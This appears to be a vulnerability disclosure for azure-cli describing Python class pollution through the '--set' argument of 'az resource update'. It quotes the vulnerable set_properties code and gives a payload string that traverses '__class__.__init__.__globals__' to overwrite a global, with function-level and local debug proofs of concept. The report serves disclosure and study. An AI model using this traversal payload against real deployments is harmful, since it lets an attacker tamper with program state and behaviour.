## azure-cli

### Meta

+ Library: azure-cli
+ Stars: 4.1K
+ Version: v2.68.0
+ CVE: [redacted
+ Status: Pending
+ Payload: ```az resource update --ids /subscriptions/2f5657fb-2e1b-4b1b-afd1-635a17df91c5/resourceGroups/Nothing_group/providers/Microsoft.Web/staticSites/Nothing --set __class__.__init__.__globals__.__name__=polluted```
+ Foundby: BlackPyrl
+ Report: Pending
+ Type: App
+ Exploitability: Low
+ Input: Local

### Library

https://github.com/Azure/azure-cli

### Vulnerable Code Snippet

```python
def set_properties(instance, expression, force_string):
    key, value = _split_key_value_pair(expression)

    if key is None or key.strip() == '':
        raise CLIError('usage error: Empty key in --set. Correct syntax: --set KEY=VALUE [KEY=VALUE ...]')

    if not force_string:
        try:
            value = shell_safe_json_parse(value)
        except:  # pylint:disable=bare-except
            pass

    # name should be the raw casing as it could refer to a property OR a dictionary key
    name, path = _get_name_path(key)
    parent_name = path[-1] if path else 'root'
    root = instance
    instance = _find_property(instance, path)
    if instance is None:
        parent = _find_property(root, path[:-1])
        set_properties(parent, '{}={{}}'.format(parent_name), force_string)
        instance = _find_property(root, path)

    match = index_or_filter_regex.match(name)
    index_value = int(match.group(1)) if match else None
    try:
        if index_value is not None:
            instance[index_value] = value
        elif isinstance(instance, dict):
            instance[name] = value
        elif isinstance(instance, list):
            throw_and_show_options(instance, name, key.split('.'))
        else:
            # must be a property name
            if hasattr(instance, make_snake_case(name)):
                setattr(instance, make_snake_case(name), value)
            else:
                if instance.additional_properties is None:
                    instance.additional_properties = {}
                instance.additional_properties[name] = value
                instance.enable_additional_properties_sending()
                logger.warning(
                    "Property '%s' not found on %s. Send it as an additional property .", name, parent_name)

    except IndexError:
        raise CLIError('index {} doesn\'t exist on {}'.format(index_value, name))
    except (AttributeError, KeyError, TypeError):
        throw_and_show_options(instance, name, key.split('.'))

```
### PoC

Function-level PoC:
```
from azure.cli.core.commands.arm import _find_property, set_properties
from dataclasses import dataclass

@dataclass
class State:
    input: str
    output: str
    textarea_key: int

obj = State('HELLO', 'WORLD', 0)

set_properties(obj, "__class__.__init__.__globals__.__name__=polluted", 'modified')
print(__name__)
```

Local-level PoC:
1. Clone the repo locally: `git clone https://github.com/Azure/azure-cli/tree/dev`
2. Select the py venv and install the `azdev`: `pip install azdev && azdev setup -c`
3. Update the `azure-cli/.vscode/launch.json` as follows:

```
{
            "name": "Azure CLI Debug (Integrated Console)",
            "type": "python",
            "request": "launch",
            "python": "/home/redacted/Desktop/python-class-pollution/class-pollution/azure-cli/poc/venv/bin/python3",
            "program": "${workspaceRoot}/src/azure-cli/azure/cli/__main__.py",
            "cwd": "${workspaceRoot}",
            "args": [
                "resource",
                "update",
                "--ids",
                "/subscriptions/2f5657fb-2e1b-4b1b-afd1-635a17df91c5/resourceGroups/Nothing_group/providers/Microsoft.Web/staticSites/Nothing",
                "--set",
                "__class__.__init__.__globals__.__name__=polluted"                
            ],
            "console": "integratedTerminal",
            "debugOptions": [
                "WaitOnAbnormalExit",
                "WaitOnNormalExit",
                "RedirectOutput"
            ],
            "justMyCode": false
        },
```

4. Add a breakpoint at the `set_properties` and see the pollution.

